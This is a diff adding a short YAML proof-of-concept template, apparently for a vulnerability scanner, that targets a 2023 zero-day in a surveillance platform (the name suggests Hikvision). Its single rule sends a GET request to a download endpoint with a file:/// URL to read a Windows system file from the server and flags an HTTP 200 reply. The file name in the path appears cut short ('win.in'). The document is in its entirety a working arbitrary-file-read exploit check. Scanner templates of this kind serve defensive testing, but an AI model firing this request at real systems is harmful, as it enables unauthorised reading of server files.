@@ -1,0 +1,14 @@
+name: poc-yaml-hk87000day20230811
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /eps/triggerSnapshot/download.action?fileUrl=file:///C:/windows/win.in
+      follow_redirects: false
+      headers:
+        User-Agent: MicroMessenger
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: Skiken
